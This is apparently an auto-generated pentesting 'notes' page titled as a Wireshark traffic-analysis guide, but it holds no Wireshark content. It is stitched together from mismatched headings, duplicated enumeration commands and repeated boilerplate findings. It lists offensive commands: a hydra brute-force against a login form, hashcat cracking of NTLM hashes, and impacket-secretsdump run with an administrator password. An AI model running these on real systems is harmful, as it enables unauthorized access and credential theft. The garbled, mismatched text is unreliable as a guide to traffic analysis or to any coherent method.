---
TitleSEO: "Network Traffic Analysis with Wireshark | ZureFX"
TitlePost: "Network Traffic Analysis with Wireshark"
Author: "ZureFX"
Description: "Personal notes on Network Traffic Analysis with Wireshark. Quick reference for pentesting and CTF challenges."
Keywords: "linux, cheatsheet, privilege escalation, enumeration, networking"
URL: "https://zurefx.github.io/notes/note-network-traffic-analysis-with-wireshark-568.html"
URL_IMAGES: ""
Date: "2026-03-03"
Tags: "Linux, Cheatsheet, Privilege Escalation, Enumeration, Networking"
Section: "notes"
Lang: "en"
main_img: "note-network-traffic-analysis-with-wireshark-568"
Permalink: "/notes/note-network-traffic-analysis-with-wireshark-568.html"
BtnLabel: "Read Notes"
Pick: 0
---
## .NET

### metasploit

```powershell
feroxbuster -h
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

## nikto

### GetNPUsers

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

```powershell
nmap -sCV -p636,135,22 10.68.245.46 -oN scan.txt
```

```bash
gobuster dir -u http://10.105.146.190/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.96.71.105/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.128.176.147/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

- `dcomexec`
- `crackmapexec`
- `impacket`
- `Resource-Based Constrained Delegation`

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

## Writable PATH

### evil-winrm

- `ldapsearch`
- `hydra`
- `LXD Privilege Escalation`
- `Path Traversal`
- `Constrained Delegation`
- `SQL Injection`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.224.139 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
gobuster dir -u http://10.102.185.236/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.157.130
```

## msfvenom

### XXE

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code.

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.
